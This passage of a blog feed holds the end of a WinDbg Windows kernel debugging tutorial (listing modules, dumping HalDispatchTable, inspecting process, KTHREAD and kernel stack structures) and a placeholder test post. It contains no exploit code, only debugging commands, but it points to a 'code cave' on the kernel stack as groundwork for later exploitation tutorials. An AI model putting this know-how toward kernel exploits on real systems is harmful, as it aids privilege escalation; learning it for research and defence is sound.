      <td><code class="language-plaintext highlighter-rouge">bd * or number</code></td>
      <td>Disable but not delete all breakpoints or specified breakpoint by number retrieved with <code class="language-plaintext highlighter-rouge">bl</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">.reload /f</code></td>
      <td>Force reload of symbols and download missing symbols</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">!address address</code></td>
      <td>Display information about specified address</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">!pte address</code></td>
      <td>Display the page table entry for the specified virtual address. Can also use with a PTE address to retrieve the associated virtual address</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">lm blank or m module_name</code></td>
      <td>List loaded modules with base and end address or list only specified module</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">!drvobj driver_name 2</code></td>
      <td>List information about specified driver</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">dt -v module!symbol</code></td>
      <td>Display table of a Windows data structure</td>
    </tr>
  </tbody>
</table>

<p>Here is an example of listing the currently loaded modules and then just the nt kernel itself:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lm m

lm m nt
</code></pre></div></div>
<p><img src="/assets/images/lm.png" alt="lm" />
<img src="/assets/images/lm_m_nt.png" alt="lm m nt" /></p>

<p>Here is an example of dumping the HalDispatchTable in the nt kernel using dqs:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dqs nt!HalDispatchTable
</code></pre></div></div>
<p><img src="/assets/images/dqs_nt_haldispatchtable.png" alt="HalDispatchTable" /></p>

<p>Start cmd.exe and launch calc.exe from the command prompt on the Debugee machine. You can then search for the calc.exe process, interact with it, and display it’s process info with:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!process 0 0 calc.exe

.process /i `EPROCESS address from above command`

g

!process
</code></pre></div></div>
<p><img src="/assets/images/calc_process.png" alt="calc process" />
<img src="/assets/images/calc_process_details.png" alt="calc process details" />
The address following THREAD in the above image is the address to the KTHREAD structure for the process. Process in Windows are a management and control mechanism for executing code. Processes do not execute code themselves. All code is executed under the process as a thread or fiber. When the process has multiple threads the one marked as ‘executive’ will have the KTHREAD. You can highlight the address and ctrl+c to copy the address and dump the KTHREAD with:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dt -v nt!_KTHREAD `kthread address`
</code></pre></div></div>
<p><img src="/assets/images/calc_kthread.png" alt="calc kthread" /></p>

<p>You can then take the StackBase, which is the address following the last address of the stack, and subtract from it to display the end of the stack. You can subtract 0x100 bytes and see a nice code cave no the Kernel Stack for the process with:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dqs `StackBase address`-100
</code></pre></div></div>
<p><img src="/assets/images/kthread.png" alt="kthread stack base" /></p>

<p>If you want to see where the Kernel Stack is currently point and what is on it you can use:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dt -v nt!_KTHREAD `KTHREAD address` KernelStack

dqs `address displayed from above command`
</code></pre></div></div>
<p><img src="/assets/images/kernelstack.png" alt="kernel stack" /></p>

<p>This was a quick run down on how to setup Windows Kernel Debugging and some quick familiarization on using WinDbg to help you get your bearings to follow along in future tutorials.</p>

<p>I highly recommend book marking the Vergilius Project to enumerate Windows Kernel Structures if you are going to be diving in to Windows Kernel Debugging <a href="https://www.vergiliusproject.com/">Vergilius Project</a></p>]]></content><author><name></name></author><category term="posts" /><summary type="html"><![CDATA[This is a quick walk through on the basics of Windows Kernel debugging. You will need two Windows Virtual Machines (VM) for this scenario. I used two Windows 11 25H2 VMs.]]></summary></entry><entry><title type="html">Test Post</title><link href="https://apexpredator-infosec.github.io/posts/2025/11/21/test.html" rel="alternate" type="text/html" title="Test Post" /><published>2025-11-21T14:23:05-05:00</published><updated>2025-11-21T14:23:05-05:00</updated><id>https://apexpredator-infosec.github.io/posts/2025/11/21/test</id><content type="html" xml:base="https://apexpredator-infosec.github.io/posts/2025/11/21/test.html"><![CDATA[<p>This is a test post</p>]]></content><author><name></name></author><category term="posts" /><summary type="html"><![CDATA[This is a test post]]></summary></entry></feed>